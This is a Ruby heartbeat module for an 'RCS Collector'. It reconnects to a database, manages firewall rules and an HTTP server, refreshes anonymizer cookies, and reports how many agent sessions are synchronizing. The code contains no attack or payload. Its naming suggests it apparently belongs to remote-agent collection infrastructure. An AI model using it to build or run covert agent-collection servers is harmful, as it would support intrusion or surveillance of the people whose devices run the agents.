require 'rcs-common/trace'
require 'rcs-common/systemstatus'
require 'rcs-common/heartbeat'
require 'rcs-common/winfirewall'

require_relative 'sessions'
require_relative 'firewall'

module RCS
  module Collector
    class HeartBeat < RCS::HeartBeat::Base
      component :collector

      def perform
        # if the database connection has gone
        # try to re-login to the database again
        unless DB.instance.connected?
          trace :debug, "heartbeat: try to reconnect to rcs-db"
          DB.instance.connect!(:collector)
        end

        # still no luck ?  return and wait for the next iteration
        return unless DB.instance.connected?

        firewall_error_message = Firewall.error_message

        if firewall_error_message
          trace(:error, "#{firewall_error_message}. The http server will #{HttpServer.running? ? 'stop now' : 'remain disabled'}")
          HttpServer.stop
        elsif !HttpServer.running?
          Firewall.create_default_rules
          HttpServer.start
        elsif Firewall.first_anonymizer_changed?
          Firewall.create_default_rules
        end

        # retrieve the anon cookie list
        DB.instance.anon_cookies(force = true)

        if firewall_error_message
          return [ERROR, firewall_error_message]
        else
          # retrieve how many session we have
          # this number represents the number of agent that are synchronizing
          active_sessions = SessionManager.instance.length

          # if we are serving agents, report it accordingly
          message = (active_sessions > 0) ? "Serving #{active_sessions} sessions" : "Idle"
          return [OK, message]
        end
      end
    end
  end
end
